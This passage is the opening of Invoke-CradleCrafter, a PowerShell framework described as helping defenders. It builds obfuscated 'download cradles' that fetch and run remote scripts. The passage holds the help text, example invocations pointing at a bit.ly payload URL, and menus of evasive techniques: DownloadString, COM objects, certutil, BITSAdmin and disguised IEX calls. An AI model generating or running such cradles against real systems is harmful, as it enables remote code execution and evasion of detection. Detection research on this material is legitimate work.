#   This file is part of Invoke-CradleCrafter.
#
#   Copyright 2018 Daniel Bohannon <@danielhbohannon>
#         while at Mandiant <http://www.mandiant.com>
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.



Function Invoke-CradleCrafter
{
<#
.SYNOPSIS

Master function that orchestrates the exploration, selection, and application of all obfuscation components available to all remote download cradle syntaxes in this framework. This project is meant to raise defender's awareness of the rich syntax options and download mechanisms which PowerShell can harness to download and invoke remote scripts. In addition, this project is meant to increase defender's detection of obscure remote download techniques that PowerShell can leverage.

Invoke-CradleCrafter Function: Invoke-CradleCrafter
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Show-Menu, Show-OptionsMenu, Show-HelpMenu, Show-Tutorial, Out-ScriptContents, Out-CradleContents, Show-MenuContext, Show-AsciiArt, and Invoke-OutCradle (all located in Invoke-CradleCrafter.ps1)
Optional Dependencies: None

.DESCRIPTION

Invoke-CradleCrafte orchestrates the exploration, selection, and application of all obfuscation components available to all remote download cradle syntaxes in this framework. This project is meant to raise defender's awareness of the rich syntax options and download mechanisms which PowerShell can harness to download and invoke remote scripts. In addition, this project is meant to increase defender's detection of obscure remote download techniques that PowerShell can leverage.

.PARAMETER Url

Specifies the Url of the staged payload to be downloaded and invoked by the remote download cradle payload.

.PARAMETER Path

(Optional) Specifies the Path to download the remote payload to for disk-based cradles.

.PARAMETER PostCradleCommand

(Optional) Specifies the post-cradle command to be invoked after the staged payload (stored at $Url) has been invoked.

.PARAMETER Command

(Optional) Specifies the CLI commands to run.

.PARAMETER NoExit

(Optional - only works if Command is specified) Outputs the option to not exit after running obfuscation commands defined in Command parameter.

.PARAMETER Quiet

(Optional - only works if Command is specified) Outputs the option to output only the final obfuscated result via stdout.

.EXAMPLE

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://bit.ly/L3g1tCrad1e'

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://bit.ly/L3g1tCrad1e' -Command 'Memory\PsWebString\All\1' -Quiet -NoExit

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://bit.ly/L3g1tCrad1e' -Command 'Memory\PsComWord\Property*\*,back,Invoke\*,CLIP' -Quiet

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://bit.ly/L3g1tCrad1e' -Command 'Memory\*\All\1,OUT cradle_result.txt' -Quiet

C:\PS> Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://bit.ly/L3g1tCrad1e' -Path 'Default_File_Path.ps1' -Command 'Disk\*\All\1,OUT cradle_result.txt' -Quiet

.NOTES

Invoke-CradleCrafter orchestrates the exploration, selection, and application of all obfuscation components available to all remote download cradle syntaxes in this framework. This project is meant to raise defender's awareness of the rich syntax options and download mechanisms which PowerShell can harness to download and invoke remote scripts. In addition, this project is meant to increase defender's detection of obscure remote download techniques that PowerShell can leverage.
This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param (
        [String]
        $Url,

        [String]
        $Path,

        [ScriptBlock]
        $PostCradleCommand,

        [String]
        $Command,
        
        [Switch]
        $NoExit,
        
        [Switch]
        $Quiet
    )
    
    # Define variables for CLI functionality.
    $Script:CliCommands       = @()
    $Script:CompoundCommand   = @()
    $Script:QuietWasSpecified = $FALSE
    $CliWasSpecified          = $FALSE
    $NoExitWasSpecified       = $FALSE

    # Either convert PostCradleCommand to a String or convert script at $Path to a String.
    If($PSBoundParameters['Url'])
    {
        $Script:CliCommands += ('set url ' + $Url)
    }
    If($PSBoundParameters['Path'])
    {
        $Script:CliCommands += ('set path ' + $Path)
    }
    If($PSBoundParameters['PostCradleCommand'])
    {
        $Script:CliCommands += ('set PostCradleCommand ' + $PostCradleCommand)
    }

    # Append Command to CliCommands if specified by user input.
    If($PSBoundParameters['Command'])
    {
        $Script:CliCommands += $Command.Split(',')
        $CliWasSpecified = $TRUE

        If($PSBoundParameters['NoExit'])
        {
            $NoExitWasSpecified = $TRUE
        }

        If($PSBoundParameters['Quiet'])
        {
            # Create empty Write-Host and Start-Sleep proxy functions to cause any Write-Host or Start-Sleep invocations to not do anything until non-interactive -Command values are finished being processed.
            Function Write-Host {}
            Function Start-Sleep {}
            $Script:QuietWasSpecified = $TRUE
        }
    }

    ########################################
    ## Script-wide variable instantiation ##
    ########################################

    # Script-level array of Show Options menu, set as SCRIPT-level so it can be set from within any of the functions.
    # Build out menu for Show Options selection from user in Show-OptionsMenu menu.
    $Script:Url                      =   ''
    $Script:Path                     =   ''
    $Script:PostCradleCommand        =   ''
    $Script:CliSyntax                =   @()
    $Script:ExecutionCommands        =   @()
    $Script:TokenArray               =   @()
    $Script:TokenArrayHistory        =   @()
    $Script:ObfuscatedCradle         =   ''
    $Script:ObfuscatedCradleWithTags =   ''
    $Script:ObfuscatedCradleHistory  =   @()
    $Script:ObfuscationLength        =   ''
    $Script:OptionsMenu              =   @()
    $Script:OptionsMenu             += , @('Url'               , $Script:Url               , $TRUE)
    $Script:OptionsMenu             += , @('Path'              , $Script:Path              , $TRUE)
    $Script:OptionsMenu             += , @('PostCradleCommand' , $Script:PostCradleCommand , $TRUE)
    $Script:OptionsMenu             += , @('CommandLineSyntax' , $Script:CliSyntax         , $FALSE)
    $Script:OptionsMenu             += , @('ExecutionCommands' , $Script:ExecutionCommands , $FALSE)
    $Script:OptionsMenu             += , @('ObfuscatedCradle'  , $Script:ObfuscatedCradle  , $FALSE)
    $Script:OptionsMenu             += , @('ObfuscationLength' , $Script:ObfuscatedCradle  , $FALSE)
    # Build out $SetInputOptions from above items set as $TRUE (as settable).
    $SettableInputOptions = @()
    ForEach($Option in $Script:OptionsMenu)
    {
        If($Option[2]) {$SettableInputOptions += ([String]$Option[0]).ToLower().Trim()}
    }

    # Ensure Invoke-CradleCrafter module was properly imported before continuing.
    If(!(Get-Module Invoke-CradleCrafter))
    {
        $PathTopsd1 = "$ScriptDir\Invoke-CradleCrafter.psd1"
        If($PathTopsd1.Contains(' ')) {$PathTopsd1 = '"' + $PathTopsd1 + '"'}
        Write-Host "`n`nERROR: Invoke-CradleCrafter module is not loaded. You must run:" -ForegroundColor Red
        Write-Host "       Import-Module $PathTopsd1`n`n" -ForegroundColor Yellow
        Exit
    }

    # Maximum size for cmd.exe and clipboard.
    $CmdMaxLength = 8190
    
    # Build interactive menus.
    $LineSpacing = '[*] '
    
    # Main Menu.
    $MenuLevel                                    =   @()
    $MenuLevel                                   += , @($LineSpacing, 'MEMORY' , '<Memory>-only remote download cradles')
    $MenuLevel                                   += , @($LineSpacing, 'DISK'   , '<Disk>-based remote download cradles')
    
    # Main\Memory Menu.
    $MenuLevel_Memory                             =   @()
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSWEBSTRING     ' , 'PS Net.WebClient + <DownloadString> method')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSWEBDATA       ' , 'PS Net.WebClient + <DownloadData> method')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSWEBOPENREAD   ' , 'PS Net.WebClient + <OpenRead> method')
    $MenuLevel_Memory                            += , @($LineSpacing, 'NETWEBSTRING    ' , '.NET [Net.WebClient] + <DownloadString> method (PS3.0+)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'NETWEBDATA      ' , '.NET [Net.WebClient] + <DownloadData> method (PS3.0+)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'NETWEBOPENREAD  ' , '.NET [Net.WebClient] + <OpenRead> method (PS3.0+)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSWEBREQUEST    ' , 'PS <Invoke-WebRequest>/<IWR> (PS3.0+)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSRESTMETHOD    ' , 'PS <Invoke-RestMethod>/<IRM> (PS3.0+)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'NETWEBREQUEST   ' , '.NET [<Net.HttpWebRequest>] class')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSSENDKEYS      ' , 'PS <SendKeys> class + <Notepad> (for the lulz)')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSCOMWORD       ' , 'PS <COM> object + <WinWord.exe>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSCOMEXCEL      ' , 'PS <COM> object + <Excel.exe>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSCOMIE         ' , 'PS <COM> object + <Iexplore.exe>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSCOMMSXML      ' , 'PS <COM> object + <MsXml2.ServerXmlHttp>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSINLINECSHARP  ' , 'PS <Add-Type> + Inline <CSharp>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'PSCOMPILEDCSHARP' , '.NET <[Reflection.Assembly]::Load> Pre-Compiled <CSharp>')
    $MenuLevel_Memory                            += , @($LineSpacing, 'CERTUTIL        ' , '<Certutil.exe> + -ping Argument')

    # Main\Disk Menu.
    $MenuLevel_Disk                               =   @()
    $MenuLevel_Disk                              += , @($LineSpacing, 'PSWEBFILE     ' , 'PS Net.WebClient + <DownloadFile> method')
    $MenuLevel_Disk                              += , @($LineSpacing, 'PSBITS        ' , 'PS <Start-BitsTransfer> (PS3.0+)')
    $MenuLevel_Disk                              += , @($LineSpacing, 'BITSADMIN     ' , '<BITSAdmin>.exe')
    $MenuLevel_Disk                              += , @($LineSpacing, 'CERTUTIL      ' , '<Certutil.exe> + -urlcache Argument')

    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsWebString               =   @()
    $MenuContext_Memory_PsWebString              += , @('Name         ','PsWebString')
    $MenuContext_Memory_PsWebString              += , @('Description  ','Downloads the requested resource as a String')
    $MenuContext_Memory_PsWebString              += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsWebString              += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsWebString              += , @('Footprint    ','Entirely memory-based')
    $MenuContext_Memory_PsWebString              += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsWebString              += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsWebString              += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 1
        
    $MenuLevel_Memory_PsWebString                 =   @()
    $MenuLevel_Memory_PsWebString                += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsWebString                += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsWebString                += , @($LineSpacing, 'Method   ' , '<DownloadString>')
    $MenuLevel_Memory_PsWebString                += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsWebString                += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsWebString_Rearrange       =   @()
    $MenuLevel_Memory_PsWebString_Rearrange      += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsWebString_Rearrange      += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsWebString_Rearrange      += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Memory_PsWebString_Cmdlet          =   @()
    $MenuLevel_Memory_PsWebString_Cmdlet         += , @($LineSpacing, '1' , "PS New-Object   --> <New-Object>"                             , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsWebString_Cmdlet         += , @($LineSpacing, '2' , "PS Get-Command  --> <Get-Command>/<GCM>"                      , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsWebString_Cmdlet         += , @($LineSpacing, '3' , "PS1.0 GetCmdlet --> <`$ExecutionContext>..."                  , @('Out-Cradle', $CradleType, 'NewObject', 3))
    
    $MenuLevel_Memory_PsWebString_Method          =   @()
    $MenuLevel_Memory_PsWebString_Method         += , @($LineSpacing, '1' , "PS DownloadString --> <DownloadString>"                       , @('Out-Cradle', $CradleType, 'DownloadString', 1))
    $MenuLevel_Memory_PsWebString_Method         += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'DownloadString', 2))
    $MenuLevel_Memory_PsWebString_Method         += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'DownloadString', 3))
    
    $MenuLevel_Memory_PsWebString_Invoke          =   @()
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsWebString_Invoke         += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsWebString_All             =   @()
    $MenuLevel_Memory_PsWebString_All            += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsWebData                 =   @()
    $MenuContext_Memory_PsWebData                += , @('Name         ','PsWebData')
    $MenuContext_Memory_PsWebData                += , @('Description  ','Downloads resource as Byte array from specified URI')
    $MenuContext_Memory_PsWebData                += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsWebData                += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsWebData                += , @('Footprint    ','Entirely memory-based')
    $MenuContext_Memory_PsWebData                += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsWebData                += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsWebData                += , @('User-Agent   ',@('None','UA generally trivial to change'))
    
    $CradleType = 2
        
    $MenuLevel_Memory_PsWebData                   =   @()
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Method   ' , '<DownloadData>')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Join     ' , '$Array<-Join''''>')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Byte     ' , '<[Char[]]>$Bytes')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsWebData                  += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsWebData_Rearrange         =   @()
    $MenuLevel_Memory_PsWebData_Rearrange        += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsWebData_Rearrange        += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsWebData_Rearrange        += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Memory_PsWebData_Cmdlet            =   @()
    $MenuLevel_Memory_PsWebData_Cmdlet           += , @($LineSpacing, '1' , "PS New-Object   --> <New-Object>"                             , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsWebData_Cmdlet           += , @($LineSpacing, '2' , "PS Get-Command  --> <Get-Command>/<GCM>"                      , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsWebData_Cmdlet           += , @($LineSpacing, '3' , "PS1.0 GetCmdlet --> <`$ExecutionContext>..."                  , @('Out-Cradle', $CradleType, 'NewObject', 3))
    
    $MenuLevel_Memory_PsWebData_Method            =   @()
    $MenuLevel_Memory_PsWebData_Method           += , @($LineSpacing, '1' , "PS DownloadData   --> <DownloadData>"                         , @('Out-Cradle', $CradleType, 'DownloadData', 1))
    $MenuLevel_Memory_PsWebData_Method           += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'DownloadData', 2))
    $MenuLevel_Memory_PsWebData_Method           += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'DownloadData', 3))

    $MenuLevel_Memory_PsWebData_Join              =   @()
    $MenuLevel_Memory_PsWebData_Join             += , @($LineSpacing, '1' , "PS Join    --> `$Array<-Join''>"                              , @('Out-Cradle', $CradleType, 'Join', 1))
    $MenuLevel_Memory_PsWebData_Join             += , @($LineSpacing, '2' , "PS Join 2  --> <-Join>`$Array"                                , @('Out-Cradle', $CradleType, 'Join', 2))
    $MenuLevel_Memory_PsWebData_Join             += , @($LineSpacing, '3' , ".Net Join  --> <[String]::Join('',>`$Array<)>"                , @('Out-Cradle', $CradleType, 'Join', 3))

    $MenuLevel_Memory_PsWebData_Byte              =   @()
    $MenuLevel_Memory_PsWebData_Byte             += , @($LineSpacing, '1' , "PS [Char[]]  --> <[Char[]]>`$Bytes"                           , @('Out-Cradle', $CradleType, 'Byte', 1))
    $MenuLevel_Memory_PsWebData_Byte             += , @($LineSpacing, '2' , "PS [Char]    --> `$Bytes|%{<[Char]>`$_}"                      , @('Out-Cradle', $CradleType, 'Byte', 2))    
    $MenuLevel_Memory_PsWebData_Byte             += , @($LineSpacing, '3' , ".Net ASCII   --> <[Text.Encoding]::ASCII.GetString>"          , @('Out-Cradle', $CradleType, 'Byte', 3))
    $MenuLevel_Memory_PsWebData_Byte             += , @($LineSpacing, '4' , "PS -As Char  --> `$Bytes|%{`$_<-As'Char'>}"                   , @('Out-Cradle', $CradleType, 'Byte', 4))

    $MenuLevel_Memory_PsWebData_Invoke            =   @()
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '1 ' , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '2 ' , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '3 ' , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '4 ' , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '5 ' , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '6 ' , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '7 ' , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '8 ' , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '9 ' , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsWebData_Invoke           += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsWebData_All               =   @()
    $MenuLevel_Memory_PsWebData_All              += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsWebOpenRead             =   @()
    $MenuContext_Memory_PsWebOpenRead            += , @('Name         ','PsWebOpenRead')
    $MenuContext_Memory_PsWebOpenRead            += , @('Description  ','Opens readable stream for data downloaded from the URI')
    $MenuContext_Memory_PsWebOpenRead            += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsWebOpenRead            += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsWebOpenRead            += , @('Footprint    ','Entirely memory-based')
    $MenuContext_Memory_PsWebOpenRead            += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsWebOpenRead            += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsWebOpenRead            += , @('User-Agent   ',@('None','UA generally trivial to change')) 

    $CradleType = 3
        
    $MenuLevel_Memory_PsWebOpenRead               =   @()
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'Method   ' , '<OpenRead>')
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'Stream   ' , '<StreamReader>/<ReadByte>')
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsWebOpenRead              += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsWebOpenRead_Rearrange     =   @()
    $MenuLevel_Memory_PsWebOpenRead_Rearrange    += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsWebOpenRead_Rearrange    += , @($LineSpacing, '2' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))

    $MenuLevel_Memory_PsWebOpenRead_Cmdlet        =   @()
    $MenuLevel_Memory_PsWebOpenRead_Cmdlet       += , @($LineSpacing, '1' , "PS New-Object   --> <New-Object>"                             , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsWebOpenRead_Cmdlet       += , @($LineSpacing, '2' , "PS Get-Command  --> <Get-Command>/<GCM>"                      , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsWebOpenRead_Cmdlet       += , @($LineSpacing, '3' , "PS1.0 GetCmdlet --> <`$ExecutionContext>..."                  , @('Out-Cradle', $CradleType, 'NewObject', 3))
    
    $MenuLevel_Memory_PsWebOpenRead_Method        =   @()
    $MenuLevel_Memory_PsWebOpenRead_Method       += , @($LineSpacing, '1' , "PS OpenRead       --> <OpenRead>"                             , @('Out-Cradle', $CradleType, 'OpenRead', 1))
    $MenuLevel_Memory_PsWebOpenRead_Method       += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'OpenRead', 2))
    $MenuLevel_Memory_PsWebOpenRead_Method       += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'OpenRead', 3))

    $MenuLevel_Memory_PsWebOpenRead_Stream        =   @()
    $MenuLevel_Memory_PsWebOpenRead_Stream       += , @($LineSpacing, '1' , "PS StreamReader   --> New-Object <IO.StreamReader>"           , @('Out-Cradle', $CradleType, 'Stream', 1))
    $MenuLevel_Memory_PsWebOpenRead_Stream       += , @($LineSpacing, '2' , "PS StreamReader 2 --> One-Liner <IO.StreamReader>"            , @('Out-Cradle', $CradleType, 'Stream', 2))
    $MenuLevel_Memory_PsWebOpenRead_Stream       += , @($LineSpacing, '3' , "PS ReadByte       --> While(1){`$res<.ReadByte()>}"           , @('Out-Cradle', $CradleType, 'Stream', 3))
    
    $MenuLevel_Memory_PsWebOpenRead_Invoke        =   @()
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsWebOpenRead_Invoke       += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsWebOpenRead_All           =   @()
    $MenuLevel_Memory_PsWebOpenRead_All          += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))

    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_NetWebString              =   @()
    $MenuContext_Memory_NetWebString             += , @('Name         ','NetWebString')
